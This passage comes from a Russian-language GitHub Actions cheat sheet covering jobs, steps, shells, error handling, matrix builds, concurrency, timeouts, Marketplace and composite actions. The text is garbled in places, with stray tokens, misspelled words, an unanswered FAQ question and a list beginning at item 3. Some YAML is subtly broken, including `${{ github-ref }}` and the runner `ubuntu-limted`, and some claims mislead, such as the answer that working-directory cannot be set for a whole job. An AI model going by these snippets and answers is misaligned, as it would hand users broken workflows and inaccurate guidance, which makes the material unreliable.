*   **Нюанс:** Если ты скомпилировал бинарный файл в `Job_A`, он **не будет** доступен в `Job_B` автоматически. Для передачи файлов между заданиями нужно использовать `artifacts`.

### 2. Параллелизм vs Последовательность
По умолчанию все Jobs в одном workflow запускаются **одновременно (параллельно)**. Это экономит время, но может быть опасно для зависимых процессов.

*   **Параллельный запуск:** Просто перечисляешь задания одно за другим.
*   динамическое управление через `needs`: Чтобы создать цепочку (сначала тест, потом деплой), используй ключевое слово `needs`. Задание не начнется, пока не завершится то, что указано в `needs`.

### 3. Ключевые параметры Job
| Параметр | Что делает | Senior Tip |
| :--- | :--- | :--- |
| `runs-on` | Выбор ОС (ubuntu-latest, windows-latest и т.д.) | Используй конкретные версии вместо `latest`, чтобы избежать внезапных поломок при обновлении образа GitHub. |
| `needs` | Определяет зависимости между заданиями | Позволяет строить направленный ациклический граф (DAG). |
| `if` | Условное выполнение (логика) | Можно проверять не только ветки, но и результаты предыдущих шагов или статус переменных. |
| `outputs` | Экспорт данных из Job для других Job | Помни: чтобы передать данные, их нужно сначала объявить в `outputs` на уровне Job, а потом использовать через контекст. |
| `timeout-minutes` | Лимит времени на выполнение | **Обязательно** ставь лимит, чтобы "зависший" тест не сжигал твои минуты (деньги) впустую. |
| `continue-on-error` | Игнорирование ошибки | Полезно для задач типа "линтер" или "проверка документации", которые не должны стопорить основной пайплайн. |

### 4. Продвинутые фишки (Advanced)
*   **Permissions:** Ты можешь ограничить права `GITHUB_TOKEN` конкретно для одной Job. Это принцип *Least Privilege* (наименьших привилегий). Если задаче не нужно пушить код — запрети ей `contents: write`.
*   **Concurrency:** Позволяет управлять тем, как несколько запусков одного и того же workflow взаимодействуют друг с другом (например, отменять старую сборку, если пришел новый коммит).

---

### 💡 Пример архитектуры
```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.get_version.outputs.VERSION }}
    steps:
      - id: get_version
        run: echo "VERSION=1.0.${{ github.run_number }}" >> $GITHUB_OUTPUT

  test:
    needs: build # Ждем завершения build
    runs-on: ubuntu-latest
    steps:
      - run: echo "Testing version ${{ needs.build.outputs.version }}"

  deploy:
    needs: [build, test] # Ждем и сборку, и тесты
    if: github.ref == 'refs/heads/main' # Деплоим только в main
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying..."
```

### ❓ FAQ (Часто задаваемые вопросы)

**В: Что произойдет, если Job из списка `needs` упадет?**
**О:** Все последующие Jobs, которые зависят от этой задачи через `needs`, будут автоматически пропущены (`skipped`). Если ты хочешь, чтобы они все равно работали, используй `if: always()` или `if: failure()`.

**В: Как передать переменную из одной Job в другую?**
**О:** Это двухэтапный процесс. 1) В первой Job сохрани значение в `$GITHUB_OUTPUT`. 2) Во второй Job обратись к нему через контекст `needs.<job_id>.outputs.<output_name>`.

**В: Можно ли запустить одну и тустую Job на разных ОС одновременно?**
**О:** Да, для этого используется `strategy: matrix`. Ты описываешь один шаблон Job, а матрица размножает его на разные операционные системы или версии языков.

**В: Зачем использовать `timeout-minutes`, если GitHub и так прерывает зависшие задачи?**
**О:** У GitHub есть глобальный таймаут (до 6 часов), но это слишком много. Твоя задача как инженера — настроить короткий таймаут (например, 10-15 минут), чтобы быстро получать фидбек и не тратить бюджет организации.

# 🛠 Тема: Steps (Шаги)

**Steps** — это атомарные единицы работы внутри одного **Job**. Если Job — это целая фабричная линия, то Step — это конкретная операция: «взять деталь», «покрасить», «проверить».

### 💡 Главное правило
Все шаги в рамках одного Job выполняются **последовательно**, один за другим. Если один шаг завершается с ошибкой (exit code $\neq$ 0), весь Job останавливается, и последующие шаги не запускаются (если не настроено иное).

---

### 🏗 Типы шагов

В GitHub Actions есть всего два основных типа шагов:

1.  **`run` (Скриптовый шаг):**
    Выполняет команды в оболочке (shell), которая установлена на раннере (обычно `bash` на Linux или `pwsh` на Windows).
    *   *Пример:* `run: npm install`.
2.  **`uses` (Готовый экшен):**
    Использование переиспользуемого кода из Marketplace или вашего репозитория. Это не команда, это вызов готового инструмента.
    *   *Пример:* `uses: actions/checkout@v4`.

---

### ⚙️ Ключевые атрибуты (Твой арсенал)

Чтобы шаги были управляемыми, используй эти параметры:

*   **`name`**: Обязательно давай осмысленные имена. Без этого в логах GitHub ты увидишь просто скучный список строк, и при ошибке придется гадать, какой именно шаг упал.
*   **`id`**: Уникальный идентификатор шага. **Критически важен**, если ты хочешь обратиться к результатам этого шага из других шагов (например, прочитать выведенный текст).
*   **`continue-on-error`**: Если `true`, то даже если шаг упадет, выполнение Job пойдет дальше. Полезно для некритичных тестов или линтеров.
*   **`working-directory`**: Указывает, в какой папке должен выполниться скрипт. Незаменимо в монорепозиториях.
*   **`env`**: Локальные переменные окружения, которые видны **только внутри этого конкретного шага**.

---

### 🧠 Senior-нюансы (То, о чем не пишут в учебниках)

1.  **Состояние файловой системы:** Все шаги внутри одного Job делят одну и ту же рабочую директорию. Если Step 1 скачал файл, Step 2 его увидит. Но если ты разделил работу на два разных **Job**, файлы между ними не перекочуют (для этого нужны *Artifacts*).
2.lam **Передача данных между шагами:** Ты не можешь просто создать переменную в Bash и использовать её в следующем шаге через `env`. Чтобы передать данные, нужно использовать специальный файл `$GITHUB_OUTPUT`.
3.  **Смена Shell:** По умолчанию на Linux это `bash`. Но ты можешь принудительно заставить шаг работать на `python` или `pwsh`, если это необходимо.
4.  **Порядок имеет значение:** Поскольку шаги идут строго друг за другом, планируй зависимости так, чтобы тяжелые операции (например, сборка Docker-образа) шли после проверок (линтеров), чтобы не тратить ресурсы впустую при ошибках.

---

### ❓ FAQ (Часто задаваемые вопросы)

**В: Что делать, если я хочу запустить скрипт, но не хочу, чтобы упал весь пайплайн?**
**О:** Используй `continue-on-error: true`. Это позволит шагу «проглотить» ошибку и продолжить работу.

**В: Как передать значение из одного шага в другой?**
**О:** Нужно использовать `id` для шага-источника и записать данные в `$GITHUB_OUTPUT`. 
*Пример:* `echo "my_var=hello" >> $GITHUB_OUTPUT`. Затем в другом шаге обратись к нему через `${{ steps.step_id.outputs.my_var }}`.

**В: Могу ли я использовать одну и ту же переменную `env` для всех шагов?**
**О:** Да, если ты определишь её на уровне `workflow` или `job`. Если определишь внутри `step`, она умрет вместе с этим шагом.

**В: Почему мой скрипт в `run` не видит переменную, которую я создал в предыдущем шаге через `export VAR=123`?**
**О:** Потому что каждый `run` шаг запускает новый процесс оболочки. Чтобы переменная «выжила», её нужно записать в специальный файл окружения: `echo "VAR=123" >> $GITHUB_ENV`.

# 📂 Тема: Рабочая директория (Working Directory)

### 🧠 Суть в двух словах
Когда GitHub запускает твой Workflow, он создает виртуальную машину (Runner) и скачивает туда твой код. **Рабочая директория** — это папка, в которой «находятся» твои команды. По умолчанию это корень твоего репозитория.

### 📍 Где мы находимся по умолчанию?
После выполнения шага `actions/checkout`, всё содержимое твоего репозитория попадает в переменную `$GITHUB_WORKSPACE`. 
*   Если ты просто запустишь `ls`, ты увидишь корень проекта.
*   Все пути, которые ты пишешь в `run:`, считаются **относительно** этого корня, если не указано иное.

### 🛠 Как изменить директорию?
Есть два способа работы с путями, и важно их не путать.

#### 1. Параметр `working-directory` (Правильный путь)
Если у тебя монорепозиторий (например, папки `frontend` и `backend`), тебе нужно запускать команды внутри этих папок. Для этого используется ключ `working-directory` на уровне **шага (step)**.

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install Frontend Deps
        run: npm install
        working-directory: ./frontend  # Команда выполнится внутри папки frontend

      - name: Build Backend
        run: make build
        working-directory: ./backend   # Команда выполнится внутри папки backend
```

#### 2. Использование `cd` в скрипте (Грязный путь)
Ты можешь написать `run: cd frontend && npm install`. Это работает, но это плохой тон для сложных цепочек команд.

---

### ⚠️ Главные нюансы и «грабли» (Senior Tips)

1.  **❌ Ловушка "Смена директории не сохраняется"**:
    Это самая частая ошибка. **Каждый шаг (step) в GitHub Actions запускается в новом процессе.**
    Если ты в первом шаге сделал `run: cd my-folder`, то во втором шаге ты **всё еще будешь в корне**. 
    *Запомни: `cd` внутри одного `run` работает, но `cd` между разными `steps` — нет.*

2.  **❌ Забытый Checkout**:
    Если ты не добавил шаг `uses: actions/checkout@v4`, твоя рабочая директория будет **пустой**. Команды вроде `ls` ничего не покажут, а `npm install` упадет с ошибкой, так как файлов нет.

3.  **✅ Использование абсолютных путей**:
    Если ты сомневаешься, где ты находишься, используй переменную окружения `$GITHUB_WORKSPACE`. Это всегда корень твоего проекта. 
    Пример: `run: ls $GITHUB_WORKSPACE/frontend` — это сработает всегда, независимо от текущей папки.

4.  **✅ Масштабирование**:
    Если у тебя очень много шагов в одной папке, вместо того чтобы писать `working-directory` к каждому, лучше объедини их в один шаг через `&&`, либо используй Composite Actions.

---

### ❓ FAQ (Частые вопросы)

**В: Можно ли задать `working-directory` сразу для всего Job (задания)?**
**О:** Напрямую в ключе `job` — нет. Тебе придется указывать его для каждого шага отдельно. Если шагов слишком много, рассмотри создание своего `Composite Action`.

**В: Что если я использую Docker Action? Будет ли там работать `working-directory`?**
**О:** Параметр `working-directory` относится к тому, где запускается оболочка (shell) на раннере. Если ты используешь `uses: docker://...`, то контекст выполнения внутри контейнера определяется тем, как собран этот Docker-образ, а не параметром в YAML.

**В: Как проверить, в какой я папке прямо сейчас?**
**О:** Просто добавь шаг с командой `pwd` (Print Working Directory):
```yaml
- name: Check current path
  run: pwd
```

**В: Если я использую `paths` в триггерах (например, запускать только при изменении в `frontend/`), влияет ли это на рабочую директорию?**
**О:** Нет. Триггеры (`on: push: paths: ...`) — это фильтры для запуска всего Workflow. Они не меняют то, где физически будет выполняться код после старта.

# 🐚 Тема: Окружение (Shells) в GitHub Actions

В GitHub Actions под **Shell** понимается интерпретатор, который выполняет команды внутри блока `run`. Это не просто «командная строка», это среда исполнения твоего скрипта.

### 1. Дефолтные значения (The "Default" Trap)
Самая частая ошибка — писать скрипт, полагаясь на то, что он будет работать везде. GitHub Actions выбирает оболочку автоматически в зависимости от операционной системы раннера:

*   **Linux / macOS:** По умолчанию используется `bash`.
    *   *Нюанс:* GitHub специально добавляет флаг `-e` (exit on error). Если любая команда в скрипте вернет ненулевой код, весь шаг (step) упадет. Это хорошо для CI, но может мешать, если ты намеренно проверяешь наличие файла.
*   **Windows:** По умолчанию используется `pwsh` (PowerShell Core).
    *   *Нюанс:* Если ты напишешь `rm -rf` (синтаксис bash) в шаге без указания shell на Windows-раннере, всё упадет. В PowerShell нужно использовать `Remove-Item`.

### 2. Явное указание Shell
Чтобы твой workflow был **cross-platform** (работал и на Linux, и на Windows), всегда явно указывай оболочку, если используешь специфичный синтаксис.

```yaml
steps:
  - name: Run bash script on any OS
    run: |
      echo "This is bash"
      ls -la
    shell: bash # Теперь даже на Windows это будет пытаться выполниться через bash (если он есть)
```

### 3. Доступные оболочки (Built-in Interpreters)
Помимо стандартных `bash` и `pwsh`, ты можешь использовать интерпретаторы языков программирования как оболочку. Это крутой прием, когда логика шага становится слишком сложной для одной строки bash.

*   **Python:** `shell: python` (удобно для манипуляций с JSON/YAML).
*   **Node.js:** `shell: node` (если нужно быстро покрутить данные из контекста GitHub).

**Пример использования Python как Shell:**
```yaml
- name: Process data with Python
  shell: python
  run: |
    import os
    import json
    # Здесь мы можем использовать мощь Python вместо костылей на bash
    print("Hello from Python shell!")
    with open(os.environ['GITHUB_ENV'], 'a') as f:
        f.write('MY_VAR=processed_value\n')
```

### 4. Нюансы и Best Practices (Senior Tips)

1.  **Multi-line Scripts:** Всегда используй символ `|` в YAML для многострочных скриптов. Это делает код читаемым и позволяет использовать отступы как в обычном скрипте.
2.  **Environment Injection:** Помни, что переменные из `env:` доступны внутри shell через стандартный синтаксис этой оболочки (например, `$MY_VAR` в bash или `$env:MY_VAR` в pwsh). Но лучше использовать синтаксис GitHub `${{ env.MY_VAR }}`, чтобы избежать проблем с экранированием спецсимволов.
3.  **Обработка ошибок:** Если тебе нужно, чтобы шаг не падал при ошибке (например, при удалении несуществующего файла), используй `continue-on-error: true` на уровне шага или специфичные флаги оболочки (например, `|| true` в bash).
4.  **Path issues:** Всегда помни, что пути в `bash` используют `/`, а в `pwsh` на Windows могут использовать `\`. Использование `shell: bash` на Windows-раннере сглаживает эту разницу, так как GitHub подтягивает Git Bash.

# 🛠 Шпаргалка: Обработка ошибок в GitHub Actions

В CI/CD ошибка — это не всегда катастрофа. Ошибка может быть ожидаемой (например, провал тестов на ветке фичи) или критической (ошибка сборки артефакта). Твоя задача — научить Workflow правильно реагировать на эти ситуации.

### 1. Базовое поведение: Fail-Fast
По умолчанию GitHub Actions работает по принципу **Fail-Fast**: если любой `step` завершается с ненулевым кодом выхода (`exit code != 0`), выполнение текущего `job` немедленно прекращается, а все последующие шаги и задания (если нет `needs`) помечаются как проваленные.

### 2. Игнорирование ошибок: `continue-on-error`
Если шаг не является критическим (например, проверка линтера или генерация документации), ты можешь разрешить ему упасть, не останавливая весь процесс.

*   **Как это работает:** Если шаг упал, статус Workflow остается "Success", но у самого шага появляется пометка о неудаче.
*   **Когда использовать:** Линтеры, тесты покрытия кода, вспомогательные скрипты.

```yaml
steps:
  - name: Run Linter
    continue-on-error: true # Даже если линтер найдет ошибки, билд пойдет дальше
    uses: actions/linter-action@v1
```

### 3. Условное выполнение: Контекст `if`
Это самый мощный инструмент Senior-инженера. Мы используем специальные функции в условии `if`, чтобы управлять логикой после ошибки.

*   **`success()`**: (По умолчанию) Выполняется только если все предыдущие шаги прошли успешно.
*   **`failure()`**: Выполняется **только если** хотя-то из предыдущих шагов завершился с ошибкой. Идеально для алертов в Slack/Telegram.
*   **`always()`**: Выполняется в любом случае (даже если Workflow был отменен вручную). Незаменим для очистки ресурсов (удаление Docker-контейнеров, остановка БД).
*   **`cancelled()`**: Выполняется только если выполнение было прервано пользователем.

**Пример паттерна "Cleanup & Notify":**
```yaml
steps:
  - name: Run Tests
    run: npm test

  - name: Cleanup Database
    if: always() # Выполнится, даже если тесты упали
    run: docker-compose down

  - name: Send Slack Notification on Failure
    if: failure() # Сработает только при провале тестов
    uses: slackapi/slack-github-action@v1
    with:
      payload: '{"text": "Build Failed! 🚨"}'
```

### 4. Обработка ошибок внутри скриптов (`run`)
Поскольку большинство шагов — это просто Bash или PowerShell, ошибка часто прячется внутри одного длинного `run` блока.

*   **Нюанс:** GitHub Actions автоматически делает `set -e` (прекращает выполнение скрипта при первой ошибке).
*   **Совет:** Если тебе нужно обработать ошибку прямо в коде (например, попробовать другой флаг), используй стандартные средства оболочки (`||`).

```yaml
- name: Smart Script
  run: |
    # Попытка выполнить команду, если не выйдет — выполни вторую
    ./deploy.sh --dry-run || ./deploy.sh --force
```

### 5. Стратегия Retries (Повторные попытки)
GitHub Actions **не имеет** встроенного ключевого слова `retry`. Если сетевой запрос к API упал, тебе нужно либо использовать сторонний Action, либо писать логику самому.

*   **Решение 1:** Использование готовых экшенов (например, `nick-fields/retry`).
*   **Решение 2:** Цикл в Bash.

```yaml
- name: Retry flaky command
  uses: nick-fields/retry@v2
  with:
    timeout_minutes: 5
    max_attempts: 3
    command: npm run test # Повторит 3 раза, если упадет
```

### ❓ FAQ (Часто задаваемые вопросы)

**В: Если я использую `continue-on-error: true`, как мне всё-таки узнать, что шаг упал?**
**О:** В логах шага будет видна ошибка, и в интерфейсе GitHub у этого шага будет стоять красный значок. Однако, если ты хочешь программно отреагировать (например, отправить уведомление), тебе придется провервать статус через `steps.<id>.outcome`.

**В: В чем разница между `outcome` и `conclusion`?**
**О:** Это важный нюанс! 
- `outcome`: Результат выполнения шага (был ли успех или ошибка).
- `conclusion`: Итоговый статус шага с учетом `continue-on-error`. Если `continue-on-error: true`, то `outcome` может быть `failure`, а `conclusion` будет `success`. Для условий `if: failure()` используй именно `outcome`.

**В: Как очистить временные файлы, если Workflow был отменен пользователем?**
**О:** Используй `if: always()`. Если использовать `if: success()`, то при отмене (cancelled) шаг очистки просто не запустится, и "мусор" останется в системе/раннере.

**В: Можно ли сделать ретрай на уровне целой Job?**
**О:** Нативно — нет. Тебе придется либо использовать внешние инструменты (например, запускать workflow по расписанию или через API), либо использовать сложные цепочки `needs` с проверкой статуса предыдущей джобы. Но лучше решать проблему нестабильности (flakiness) в самих тестах/скриптах.

# 🚀 Шпаргалка: Matrix Strategy в GitHub Actions

**Matrix Strategy** — это механизм, который позволяет запускать один и тот же Job (задание) несколько раз с разными параметрами. Вместо того чтобы копировать код для тестирования проекта на Node.js 14, 16 и 18, ты создаешь одну матрицу, и GitHub сам генерирует нужное количество параллельных задач.

### 🛠 Основные концепции

#### 1. Базовая матрица (Combinatorial Explosion)
Ты определяшь массив переменных. GitHub берет **все возможные комбинации** этих переменных.

```yaml
jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest]
        node-version: [14, 16, 18]
```
*В этом примере будет создано **6 задач** (2 ОС × 3 версии Node).*

#### 2. Исключение комбинаций (`exclude`)
Иногда какая-то конкретная комбинация не нужна или заведомо сломана (например, старая версия Python не работает на Windows). Используй `exclude`, чтобы выкинуть лишнее.

```yaml
strategy:
  matrix:
    os: [ubuntu-latest, windows-latest]
    python-version: ['3.8', '3.9', '3.10']
    exclude:
      # Удаляем только эту конкретную комбинацию
      - os: windows-latest
        python-version: '3.8'
```

#### 3. Добавление специфичных данных (`include`)
`include` работает в двух режимах:
*   **Добавление новых переменных к существующим комбинациям:** Ты можешь добавить флаг `experimental: true` только для одной из матриц.
*   **Создание новых комбинаций:** Если ты перечислишь в `include` набор ключей, которого нет в основной матрице, GitHub создаст отдельный Job для этого набора.

```yaml
strategy:
  matrix:
    os: [ubuntu-latest]
    node: [16]
    include:
      # Добавим дополнительную задачу с другой версией, не меняя основную матрицу
      - os: ubuntu-latest
        node: 18
        experimental: true
```

#### 4. Динамическая матрица (Advanced Level)
Это то, что отличает Senior от Middle. Ты можешь сформировать список параметров в **предыдущем Job**, превратить его в JSON и передать в текущий Job через `outputs`. Это полезно, если список версий или сервисов хранится во внешнем файле или генерируется скриптом.

*Схема: Job 1 (генерация JSON) $\rightarrow$ Output $\rightarrow$ Job 2 (использование `fromJSON()`).*

---

### ⚠️ Нюансы и "Подводные камни" (Senior Insights)

1.  **Cost & Resource Management:** Помни, что каждый элемент матрицы — это отдельный запуск Runner'а. Если ты создашь матрицу на 100 комбинаций, ты мгновенно сожжешь лимиты минут своего репозитория. Всегда ограничивай масштаб.
2.  **Fail-fast (По умолчанию `true`):** Если один из Job в матрице падает, GitHub **сразу отменяет** все остальные запущенные задачи этой матрицы. 
    *   *Зачем это нужно:* Чтобы не тратить ресурсы на бесполезные тесты, если база уже сломана.
    *   *Как отключить:* Установи `fail-fast: false`, если хочешь увидеть результаты всех тестов, даже если часть упала.
3.  **Concurrency (Конкурентность):** Если матрица огромная, задачи могут встать в очередь (Queue), если у тебя закончились доступные Runner'ы.
4.  **Зависимости (`needs`):** Если твой Job с матрицей зависит от другого Job (`needs: build`), то при падении `build` вся матрица даже не начнет запускаться.

**В: Что произойдет, если я использую `exclude`, который не совпадает ни с одной комбинацией?**
**О:** Ничего страшного. GitHub просто проигнорирует это правило и продолжит работу по стандартной логике. Ошибки не будет.

**В: Можно ли в матрице использовать переменные из `env`?**

# 🚀 Шпаргалка: Concurrency (Конкурентность) в GitHub Actions

### 💡 Что это такое?
**Concurrency** — это механизм управления «очередями» в твоих workflow. Он нужен, чтобы контролировать, сколько экземпляров одного и того зрения процесса могут работать одновременно. 

Представь: ты пушишь код в ветку каждые 2 минуты. Если у тебя тяжелые тесты (идут 10 минут), то через 5 пушей у тебя запустятся 5 параллельных потоков, которые будут жрать ресурсы и, возможно, конфликтовать друг с другом. Concurrency позволяет это предотвратить.

---

### 🛠 Основной механизм: Ключ `concurrency`
В YAML-файле ты определяешь **группу (group)**. Если два запуска workflow имеют одинаковое имя группы, GitHub понимат: «Ага, это одно и то же», и применяет правила очереди.

#### 1. Режим "Очередь" (По умолчанию)
Если запущен Workflow А (группа `deploy`), и приходит новый Workflow Б (та же группа `deploy`), то **Б встает в очередь** и ждет, пока А завершится.
*   **Когда использовать:** Деплой на один и тот же сервер, работа с БД, где нельзя допускать два одновременных изменения.

#### 2. Режим "Отмена" (`cancel-in-progress: true`)
Если запущен Workflow А, и приходит новый Workflow Б, GitHub **мгновенно убивает** процесс А и запускает Б.
*   **Когда использовать:** Тесты (CI), линтеры, сборка артефактов. Нет смысла проверять старый коммит, если пришел новый — старый уже не актуален.

---

### 🧠 Senior-уровень: Динамические ключи (Самое важное!)
Если ты просто напишешь `concurrency: my-group`, то **все** пуши во **всех** ветках будут стоять в одной очереди. Это убьет параллелизм всего проекта. 

Нужно делать ключ **динамическим**, привязанным к контексту.

#### Правильный паттерн для CI (тесты):
```yaml
concurrency:
  # Группа уникальна для каждой ветки/PR
  group: ${{ github.workflow }}-${{ github-ref }}
  cancel-in-progress: true
```
*Здесь: если ты пушишь в `feature-1`, это не затронет тесты в `feature-2`.*

#### Правильный паттерн для CD (деплой):
```yaml
concurrency:
  # Группа привязана к окружению (например, production)
  group: deployment-${{ github.ref }}
  cancel-in-progress: false # Не убиваем деплой! Важно довести его до конца.
```

---

### ⚠️ Нюансы и "Подводные камни"

1.  **Уровни области видимости:** `concurrency` можно прописать на уровне всего **Workflow** (тогда применяется ко всем джобам) или на уровне конкретной **Job** (тогда только эта джоба будет ждать).
2.  **Разрыв связи:** Если ты используешь `cancel-in-progress: true`, помни, что прерванный workflow может оставить "мусор" (например, не удаленные временные файлы или незакрытые сессии), если ты не предусмотрел очистку.
3.  **Сложные ключи:** Можно комбинировать переменные. Например, `group: ${{ github.workflow }}-${{ github.event.pull_request.number }}` — это идеально для PR, чтобы тесты одного PR не мешали другому, но внутри одного PR старые задачи отменялись.

---

### ❓ FAQ (Частые вопросы)

**В: Что будет, если я использую `cancel-in-progress: true` на деплое?**
**О:** Это очень опасно. Если процесс деплоя прервется на середине (например, когда файлы уже скопированы, но конфиг еще не обновился), ты получишь «сломанное» окружение (Broken State). Для деплоев всегда используй `false`.

**В: Как сделать так, чтобы разные ветки работали параллельно, но внутри одной ветки — по очереди?**
**О:** Используй динамический ключ с референсом: `group: ${{ github.ref }}`. Это создаст отдельную очередь для каждой ветки.

**В: Поможет ли Concurrency сэкономить деньги на GitHub Actions?**
**О:** Да, если использовать `cancel-in-progress: true` для тестов. Ты не будешь платить за минуты выполнения задач, которые уже потеряли смысл из-за появления нового коммита.

**В: Может ли Concurrency работать между разными Workflow файлами?**
**О:** Да! Если в двух разных YAML-файлах указана одна и та же строка в `group`, они будут конкурировать за одну очередь.

# ⏱️ Тема: Timeout (Тайм-ауты)

**Timeout** — это твой предохранитель. В мире CI/CD «зависший» процесс — это потерянные деньги (если используешь платные раннеры) и заблокированный конвейер (другие задачи ждут завершения предыдущей). Тайм-аут принудительно убивает процесс, если он не уложился в отведенное время.

### 📍 Где можно настроить Timeout?

В GitHub Actions есть два уровня управления временем: на уровне **Job** (задания) и на уровне **Step** (шага).

#### 1. Уровень Step (Самый важный)
Ты можешь ограничить время выполнения конкретного шага. Это критично для задач, которые зависят от внешних факторов (например, скачивание тяжелых зависимостей или запуск интеграционных тестов).

```yaml
jobs:
  test-job:
    runs-on: ubuntu-latest
    steps:
      - name: Run heavy tests
        run: npm test
        timeout-minutes: 10 # Если тест идет > 10 мин, шаг упадет с ошибкой
```

#### 2. Уровень Job
Ты можешь ограничить время выполнения всего задания целиком. Это «верхний предел» для всех шагов внутри этого job.

```yaml
jobs:
  build-job:
    runs-on: ubuntu-limted
    timeout-minutes: 30 # Весь job не может длиться дольше 30 минут
    steps:
      - run: sleep 100 # Если этот шаг превысит общий лимит job, всё упадет
```

---

### 🧠 Нюансы от Senior-инженера (О чем молчат туториалы)

1.  **Default Behavior (Значения по умолчанию):**
    *   Если ты **не указал** `timeout-minutes` для Job, GitHub по умолчанию может держать его запущенным очень долго (до 6 часов на стандартных раннерах). Это опасно! Если твой скрипт попал в бесконечный цикл, ты будешь платить за эти 6 часов.
    *   **Золотое правило:** Всегда явно указывай `timeout-minutes` для критичных шагов и для самих Job.

2.  **Иерархия лимитов:**
    Тайм-аут Job — это «потолок». Если у тебя Job ограничен 15 минутами, а Step ограничен 30 минутами, то шаг всё равно умрет на 15-й минуте вместе со всем заданием.

3.  **Взаимодействие с `continue-on-error`:**
    Если ты поставил `continue-on-error: true`, но при этом случился **timeout**, шаг все равно будет помечен как "failed" (внутри себя), но выполнение workflow пойдет дальше. Однако, если тайм-аут превышен на уровне Job — всё задание прервется немедленно, и `continue-on-error` на шагах уже не поможет.

4.  **Зачем это нужно в Production?**
    *   **Экономия денег:** Предотвращение бесконечных циклов в скриптах.
    *   **Борьба с Deadlocks:** Если тесты зависли из-за блокировки базы данных, тайм-аут «разбудит» пайплайн и даст сигнал об ошибке.
    *   **Чистота очереди:** Чтобы старые застрявшие задачи не занимали очередь (concurrency slots) для новых PR.

### ❓ FAQ (Часто задаваемые вопросы)

**В: Что я увижу в логах, если сработал timeout?**
**О:** В логах GitHub Actions будет четкая пометка: `The step was cancelled because it exceeded the timeout limit`. Это поможет сразу отличить баг в коде от проблем с инфраструктурой.

**В: Можно ли использовать дробные числа (например, 1.5 минуты)?**
**О:** Нет. Параметр `timeout-minutes` принимает только целые числа (integers).

**В: На что лучше ставить тайм-аут: на Step или на Job?**
**О:** Лучшая практика — **комбинировать**. Ставь жесткий, но разумный лимит на Job (чтобы не раздувать бюджет), и более точечные лимиты на шаги, которые потенциально могут «зависнуть» (сетевые запросы, тяжелые тесты).

**В: Влияет ли timeout на Self-hosted раннеры?**
**О:** Да, абсолютно. Если ты используешь свои сервера, тайм-аут поможет освободить ресурсы твоего сервера для других задач, чтобы не плодить «зомби-процессы».

# 🛒 Тема: Marketplace Actions

**Marketplace Actions** — это библиотека готовых «кирпичиков» (предустановленных скриптов), которые ты можешь вставлять в свои workflow, чтобы не изобретать велосипед. Вместо того чтобы писать 50 строк bash-скрипта для настройки Python или деплоя в AWS, ты просто берешь готовый экшен и используешь его одной строкой.

### 🛠 Как это работает (Синтаксис)
Для использования экшена используется ключевое слово `uses`. Все входные параметры передаются через блок `with`.

```yaml
steps:
  - name: Setup Node.js
    uses: actions/setup-node@v4 # Вызов экшена
    with:
      node-version: '20'        # Передача параметров (inputs)
```

### 🏗 Типы экшенов (Что под капотом?)
Как Senior, ты должен понимать, что именно запускается на твоем раннере:
1.  **JavaScript Actions:** Самые быстрые и легкие. Работают прямо в окружении раннера. Идеальны для простых манипуляций с файлами или API.
2.  **Docker Container Actions:** Запускаются внутри Docker-контейнера. Это «тяжелая артиллелярная» артиллерия. Плюс: ты получаешь идентичную среду выполнения (любые зависимости уже внутри образа). Минус: работают только на Linux-раннерах и запускаются дольше.
3.  **Composite Actions:** Это экшены, которые сами состоят из нескольких шагов (`steps`). Они позволяют упаковать логику нескольких команд в один переиспользуемый блок.

### ⚠️ Золотые правила безопасности (Senior Level)
Это самая важная часть. Использование стороннего кода — это всегда риск **Supply Chain Attack** (атака на цепочку поставок).

1.  **Принцип доверия:** Используй экшены от проверенных вендоров (`actions/`, `google-github-actions/`, `aws-actions/`) или тех, у кого высокий рейтинг и прозрачный аудит кода.
2.  **Версионирование (Versioning):** 
    *   `@v1` — **Плохо для продакшена.** Это "плавающая" ссылка. Если автор экшена выпустит `v1.1`, которая сломает твой билд, твой пайплайн упадет без твоего ведома.
    *   `@v1.2.3` — **Хорошо.** Ты зафиксировал минорную версию.
    *   `@<commit_sha>` — **Идеально (Maximum Security).** Использование хэша коммита гарантирует, что код экшена никогда не изменится. Это единственный способ быть на 100% уверенным, что никто не подменил код в репозитории экшена.

### 💡 Нюансы и советы
*   **Inputs & Outputs:** Всегда читай `README` экшена перед использованием. У каждого экшена свои входные параметры (`inputs`) и свои выходные данные (`outputs`), которые можно передать в следующий шаг через контекст `${{ steps.step_id.outputs.result }}`.
*   **Поиск:** Не ограничивайся только поиском по названию. Используй фильтры по языкам и популярности в [GitHub Marketplace](https://github.com/marketplace).

3. Используй инструменты анализа (например, `checkov` или `trivy`) для сканирования ваших workflow.

# 🧩 Шпаргалка: Composite Actions

### 🎯 Что это такое?
**Composite Action** — это способ объединить несколько шагов (`steps`) в один единый экшен. Если ты замечаешь, что копируешь одни и те же 5-10 шагов из одного workflow в другой — тебе пора делать Composite Action.

Это "макрос" для твоих шагов. Вместо того чтобы описывать логику установки зависимостей, кэширования и проверки версии каждый раз, ты создаешь один экшен и вызываешь его одной строчкой `uses:`.

---

### 🛠 Анатомия (Структура файла `action.yml`)
Composite Action всегда живет в отдельной папке и управляется файлом `action.yml`.

```yaml
name: 'My Composite Action'
description: 'Устанавливает зависимости и проверяет версию Node.js'

# 1. Входные параметры (что мы передаем в экшен)
inputs:
  node-version:
    description: 'Версия Node.js'
    required: true
    default: '18'
  cache-dependency-path:
    description: 'Путь к файлу lock-файла'
    required: false

# 2. Выходные данные (что экшен возвращает обратно в workflow)
outputs:
  build-status:
    description: "Результат сборки"
    value: ${{ steps.check-step.outputs.status }}

runs:
  using: 'composite' # КРИТИЧЕСКИ ВАЖНО: указываем тип
  steps:
    # 3. Сами шаги
    - name: Setup Node.js
      uses: actions/setup-node@v4
      with:
        node-version: ${{ inputs.node-version }}

    - name: Install dependencies
      shell: bash # КРИТИЧЕСКИ ВАЖНО: в Composite Actions shell обязателен!
      run: npm ci
      working-directory: ${{ inputs.cache-dependency-path }}

    - name: Check status
      id: check-step
      shell: bash
      run: echo "status=success" >> $GITHUB_OUTPUT
```

---

### ⚠️ Senior Nuances (То, на чем все валятся)

